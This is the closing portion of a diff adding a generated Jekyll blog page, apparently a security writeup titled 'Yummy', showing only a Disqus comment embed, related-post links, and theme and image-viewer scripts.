+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/14/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1.html';
+     this.page.identifier = '/writeups/2025/07/14/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1';
+     this.page.title = 'Yummy 11ab95255291808cac2bdff728027ba4';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
